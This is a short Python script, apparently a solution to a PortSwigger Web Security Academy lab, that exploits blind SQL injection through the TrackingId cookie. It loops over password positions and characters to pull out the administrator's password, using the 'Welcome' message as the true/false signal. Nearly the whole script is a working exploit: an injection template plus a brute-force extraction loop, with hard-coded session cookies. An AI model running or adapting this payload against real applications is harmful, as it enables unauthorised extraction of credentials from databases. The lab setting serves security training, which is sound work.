"""
This script is written to find a blind sql injection by iteration over the characters for a password. 

Source lab: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
"""
import requests

url = "https://ac7f1fbb1f821ec680b0003700470081.web-security-academy.net/filter?category=Gifts"

cookie_session = "rMTpiu1kXncgFSd5wiIrPSZ1bTSguPgz"
cookie_trackr = "H0ygHw0sOwv8TJJL"
injection_template = "' AND (select 'a' from users where username='administrator' and substr(password, {}, 1) = '{}')='a"

payload = "abcdefghijklmnopqrstuvwxyz0123456789"

for i in range(20):
    offset = i + 1
    for char in payload:
        injection = injection_template.format(offset, char)
        response = requests.get(
            url,
            cookies={"session": cookie_session, "TrackingId": cookie_trackr + injection}
        )
        if 'Welcome' in response.content.decode():
            print("Next password character is " + char)
